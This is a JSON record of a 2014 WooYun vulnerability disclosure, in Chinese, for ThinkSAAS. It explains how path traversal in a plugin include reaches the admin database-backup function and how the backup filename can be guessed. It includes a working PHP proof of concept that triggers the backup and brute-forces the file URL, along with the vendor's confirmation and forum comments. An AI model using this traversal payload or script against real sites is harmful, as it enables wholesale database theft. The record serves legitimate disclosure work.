{"id": 4093, "wybug_id": "wooyun-2014-051743", "wybug_title": "ThinkSAAS逻辑漏洞可致拖库", "wybug_corp": "thinksaas.cn", "wybug_author": "My5t3ry", "wybug_date": "2014-02-22 22:54", "wybug_open_date": "2014-05-23 22:55", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-23：\t细节向公众公开  简要描述： ThinkSAAS的一个逻辑漏洞导致可以实时备份网站数据库，同时可以获取备份数据库文件名。下载实时备份的数据库实现脱裤。漏洞影响所有版本。 详细说明：  thinksaas系统使用常量IN_TS来控制页面的访问，然后在每个功能模块用一句代码：\ndefined('IN_TS') or die('Access Denied.');\n来限制访问，这样设计带来的问题是，一个文件包含可以通杀，越权访问执行任意功能模块。看到/app/user/action/plugin.php代码：\n<?php//插件条件入口defined('IN_TS') or die('Access Denied.');if(is_file('plugins/'.$app.'/'.$plugin.'/'.$in.'.php')){\trequire_once('plugins/'.$app.'/'.$plugin.'/'.$in.'.php');}else{\ttsNotice('sorry:no plugin!');}\n利用上面的代码可以任意包含php文件，接着看到/app/system/action/sql.php代码：\n<?php defined('IN_TS') or die('Access Denied.');switch($ts){\tcase \"\":\t\t\t\t//输出备份文件\t\t$arrSqlFile = tsScanDir('data/baksql','file');\t\t\t\tinclude template('sql');\t\tbreak;\t\t\t//优化\tcase \"optimize\":\t\t$arrTables = $db->fetch_all_assoc(\"SHOW TABLES\");\t\tforeach($arrTables as $key=>$item){\t\t\t$db->query(\"OPTIMIZE TABLE `\".$item.\"` \");\t\t}\t\tqiMsg('优化数据库成功！');\t\tbreak;\t\t\t//备份导出\tcase \"export\":\t\t\trequire_once 'thinksaas/DbManage.php';\t\t$bakdb = new DBManage ( $TS_DB['host'].':'.$TS_DB['port'], $TS_DB['user'], $TS_DB['pwd'], $TS_DB['name'], 'utf8' );\t\t$bakdb->backup ('','data/baksql/');\t\t\t\tqiMsg('数据库备份完毕！');\t\t\tbreak;\n利用/app/user/action/plugin.php文件的包含漏洞可以越权执行后台的数据库备份功能，生成数据库备份文件，同时备份的数据库是以date('YmdHis')+_all_v1.sql来命名，可以简单预测到备份数据库文件名。   漏洞证明：  \n<?phpdate_default_timezone_set('Asia/Hong_Kong');$url = \"http://192.168.116.129/thinksaas/index.php?app=user&ac=plugin&plugin=face&in=my5t3ry/../../../../app/system/action/sql&ts=export\";file_get_contents($url);$time = date('YmdHis');for($i = $time; $i <= $time + 300; $i++){\t$filename = $i .\"_all_v1.sql\";\t$url = \"http://192.168.116.129/thinksaas/data/baksql/\".$filename;\tif (@file_get_contents($url, null, null, -1, 1)){\t\techo $url;\t}}?>\n使用上面的代码可以备份数据库并得到备份数据库文件名，测试如图：\n\n   修复方案：  过滤&限制   版权声明：转载请注明来源 My5t3ry@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-02-23 22:39 厂商回复： 已经修复，感谢反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-22 22:55 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  有意思 特首页    \n     2014-02-22 22:58 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  再次关注    \n     2014-02-22 23:49 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  围观    \n     2014-02-23 11:02 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  围观    \n     2014-02-23 13:51 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  围观    \n     2014-03-16 08:46 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  那个意思是只要有那个变量提交就不会die？还是啥意思来着    \n     2014-03-16 18:21 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @wefgod 哥们就是这个意思    \n     2014-03-16 19:13 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @_Evil 哦哦我去，想想才明白下面为什么要用index.php，原来是这个意思    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}